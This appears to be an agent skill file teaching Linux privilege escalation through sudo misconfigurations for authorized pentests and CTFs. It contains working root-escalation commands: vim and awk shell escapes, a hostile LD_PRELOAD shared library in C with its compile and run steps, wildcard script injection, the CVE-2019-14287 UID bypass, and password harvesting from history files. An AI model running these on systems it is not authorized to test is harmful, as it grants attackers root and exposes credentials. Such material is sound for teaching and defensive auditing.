---
name: privesc-linux-vectors-sudo-misconfigurations
description: Use when authorized Linux privilege escalation hinges on sudo
  and you need to parse sudo -l output like an auditor, not a script
  kiddie. Covers reading every sudoers line including NOPASSWD entries,
  user and host aliasing, wildcard argument injection, sudoedit file
  write primitives, LD_PRELOAD and library path tricks through sudo,
  env_keep and secure_path abuse, CVE-2019-14287 style user ID edge
  cases, and chaining a non-root sudo target into full root. For
  authorized pentests, labs, and CTFs only.
version: 1.0.0
domain: privesc
lifecycle: stable
last_verified: 2026-10-23
requires: [privesc-linux-vectors]
extends: []
parent: privesc-linux-vectors
relates: [privesc-linux, privesc-linux-vectors-suid-binaries]
tools:
  - name: sudo
    version: 1.9.x
  - name: linpeas
    version: 2.x
  - name: Python
    version: 3.12
  - name: gcc
    version: 13.2.0
---
`sudo -l` is the highest-value command in Linux privilege escalation on an authorized engagement: one misconfigured sudoers line is often a straight path to root with no exploit code and minimal noise. This sub-skill teaches systematic sudoers analysis: how to read every field of `sudo -l` output, which patterns are exploitable (NOPASSWD on scriptable binaries, wildcards, sudoedit, preserved environment variables), and how to chain partial sudo rights into full root. Scope is authorized penetration tests, labs, and CTFs only.

## Quick Workflow

1. Run `sudo -l` and also try `sudo -l -U <otheruser>` if you can; save the full output including the `env_keep` and `secure_path` lines.
2. Read `/etc/sudoers` and `/etc/sudoers.d/*` directly when readable; they reveal aliases and included files that `sudo -l` summarizes.
3. Classify each entry: exact binary path versus wildcards, NOPASSWD versus password, target user root versus another user, argument restrictions.
4. Check every permitted binary against GTFOBins sudo entries and test the primitive with `id` through it.
5. Look for environment tricks: `LD_PRELOAD` permission, `env_keep` additions, `SETENV` tag, `sudoedit` entries.
6. Exploit the quietest entry first, confirm with `sudo -l` from the new context if you land as another user, and chain upward.

## 1. Reading sudo -l output precisely

Every field matters. Capture the whole output, not just the command list.

```bash
sudo -l
```

Example output shape:

```
Matching Defaults entries for app on web01:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+="LD_PRELOAD"

User app may run the following commands on web01:
    (ALL) NOPASSWD: /usr/bin/vim
    (root) /usr/bin/python3 /opt/scripts/*.py
    (deployer) NOPASSWD: /usr/bin/systemctl restart app.service
```

Read it as an auditor: the `env_keep+="LD_PRELOAD"` line combined with any sudo entry is a classic instant win. `(ALL) NOPASSWD: /usr/bin/vim` is a GTFOBins shell. The wildcard `/opt/scripts/*.py` invites argument and path tricks. The `(deployer)` entry is a stepping stone, not root, but stepping stones chain.

## 2. NOPASSWD binaries and GTFOBins

Any NOPASSWD entry on a binary with file write, shell escape, or library loading behavior is usually game over.

```bash
sudo /usr/bin/vim -c ':!/bin/sh'
```

Other high-value patterns: `less`, `more`, `man` (all shell out with `!`), `find` (`-exec`), `awk` (`system()`), `python3` (direct code execution), `vim`/`nano` (shell escapes and file writes), `tar`/`zip` (checkpoint features), `git` (pager escape), `env` (runs anything). Verify each candidate keeps root:

```bash
sudo /usr/bin/awk 'BEGIN {system("id")}'
```

Example output shape: `uid=0(root) gid=0(root) groups=0(root)` confirms the primitive. If the sudoers entry restricts arguments (for example `vim /etc/app.conf` only), check whether the binary itself allows escapes regardless of the file argument; many do.

## 3. Wildcard argument injection

Wildcards in the sudoers path let you smuggle extra arguments or choose which file matches.

```bash
sudo /usr/bin/python3 /opt/scripts/*.py
```

If `/opt/scripts/` is writable, drop your own `evil.py` there; the wildcard matches it and sudo runs it as root. Even without writability, check whether any existing matched script is writable or imports a writable module. Also watch for argument injection where the entry permits flags:

```
(app) NOPASSWD: /usr/bin/tar cf /backup/*
```

Unquoted wildcards combined with tar's checkpoint feature or `--use-compress-program` turn archiving into code execution. Always test with a harmless `id` payload first.

## 4. sudoedit file write primitive

`sudoedit` (or `sudo -e`) entries let you edit a file as another user, which becomes arbitrary file write when the editor is escapable.

```bash
sudo -l | grep -i edit
sudo sudoedit /etc/app/config.conf
```

Inside the editor, shell escapes (`:!/bin/sh` in vim) run as the target user. Even without escapes, editing power over files like cron scripts, service units, or `authorized_keys` converts directly to execution. Check which editor sudoedit invokes (`SUDO_EDITOR`, `VISUAL`, `EDITOR`); if you control one of those variables and the sudoers entry preserves the environment, point it at your own script.

## 5. LD_PRELOAD, SETENV, and env_keep abuse

These are the quietest sudo escalations because they hijack any permitted binary, even boring ones.

```bash
sudo -l | grep -iE "preload|setenv|env_keep"
```

If `env_keep` includes `LD_PRELOAD`, or the entry carries the `SETENV` tag, compile a hostile shared library with a constructor and preload it into any sudo invocation:

```c
#include <unistd.h>
__attribute__((constructor)) void pwn(void) {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
}
```

```bash
gcc -shared -fPIC -o /tmp/pwn.so pwn.c
sudo LD_PRELOAD=/tmp/pwn.so /usr/bin/id
```

Example output shape: `uid=0(root) gid=0(root)` from a binary as dull as `/usr/bin/id`. Note that sudo sanitizes `LD_PRELOAD` by default; this only works when the configuration explicitly keeps it or grants `SETENV`.

## 6. Non-root targets and user ID edge cases

Entries like `(deployer)` or `(backup)` are stepping stones: become that user, then re-enumerate from the stronger position.

```bash
sudo -u deployer /usr/bin/systemctl restart app.service
sudo -u deployer /bin/bash
sudo -l
```

The second `sudo -l` as the new user often reveals a fresh path to root. Also check for the historic user ID confusion pattern (CVE-2019-14287): an entry like `(ALL, !root)` was bypassable with `sudo -u#-1`, and while patched in modern sudo, the pattern reminds you to test numeric UID edge cases whenever the sudoers syntax looks unusual. Verify the sudo version with `sudo --version` and match it against known sudo CVEs only as a last resort.

## Edge cases

- `sudo -l` may require the user's password; harvest it from history, config files, environment, or password reuse before assuming sudo is unavailable.
- Entries restricted to specific hosts (`web01` versus `ALL`) only apply where the hostname matches; check `hostname` against the sudoers host field.
- Command arguments in sudoers must match exactly unless wildcards are present; a trailing `""` means no arguments allowed, which kills most GTFOBins one-liners for that entry.
- `NOEXEC` tag blocks shell escapes from the permitted binary but does not block the binary's own legitimate file writes, which can still be useful.
- `sudoedit` follows symlinks in some configurations; a sudoedit entry on a path you can replace with a symlink may redirect the write to a privileged file.
- Time-based entries (`NOTBEFORE`/`NOTAFTER` in newer sudo) silently fail outside their window; check the system clock if an entry refuses to run.

## Escalation

- If `sudo -l` shows nothing, read `/etc/sudoers.d/` and `/etc/sudoers` directly when file permissions allow; misconfigured permissions on sudoers fragments are themselves a finding.
- When the permitted binary has no GTFOBins entry, analyze it: `strings` for invoked commands, `ltrace` for library calls, and config files it reads may reveal a softer path.
- If sudo is fully locked down, pivot to the sibling sub-skills: SUID binaries and cron hijacking are the next highest-yield classes.
- Harvested credentials beat sudo tricks: try every found password with `sudo -S` and `su` before building exploit chains, and document the reuse.

## Detection and defender view

Defenders should centralize sudo logs, review sudoers with `visudo -c` and version control, avoid NOPASSWD except where strictly needed, never grant wildcards, and strip `LD_PRELOAD` from `env_keep`. sudoreplay and session logging capture what sudo users actually did. From the authorized tester side, sudo abuse is relatively quiet (it looks like legitimate admin activity in logs), but `LD_PRELOAD` constructors and unexpected child processes of sudo are detectable by EDR; keep payloads minimal and document every sudo invocation for the report's evidence section.

## Key references

- MITRE ATT&CK T1548.003 (Sudo and Sudo Caching)
- sudoers manual: https://www.sudo.ws/docs/man/sudoers.man
- GTFOBins sudo section: https://gtfobins.github.io/#+sudo
- CVE-2019-14287 (sudo user ID confusion): https://www.sudo.ws/security/advisories/minus_1_uid/
- sudo log and sudoreplay docs: https://www.sudo.ws/docs/man/sudoers.man (log_input, log_output)
- HackTricks sudo checklist: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
